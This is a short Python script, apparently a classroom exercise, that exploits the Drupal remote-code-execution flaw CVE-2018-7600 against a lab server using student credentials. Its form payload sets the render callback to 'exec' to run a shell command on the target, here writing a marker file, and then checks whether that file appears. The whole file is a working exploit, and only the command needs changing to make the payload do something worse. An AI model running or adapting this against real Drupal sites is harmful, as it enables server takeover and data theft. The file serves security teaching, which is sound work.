
import sys
import requests
from requests.auth import HTTPBasicAuth

# Based on https://github.com/a2u/CVE-2018-7600 by Vitalii Rudnykh

target = "https://drupal.samsclass.info/"

url = target + 'user/register?element_parents=account/mail/'+'%23value&ajax_form=1&_wrapper_format=drupal_ajax' 

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup','mail[#markup]': 'echo "HELLO" | tee ROBERTDEAN.txt'}

r = requests.post(url, data=payload, auth=HTTPBasicAuth('student1', 'student1'))

check = requests.get(target + 'ROBERTDEAN.txt', auth=HTTPBasicAuth('student1', 'student1'))
if check.status_code != 200:
    sys.exit("Not exploitable")

print ('\nCheck: '+target+'ROBERTDEAN.txt')
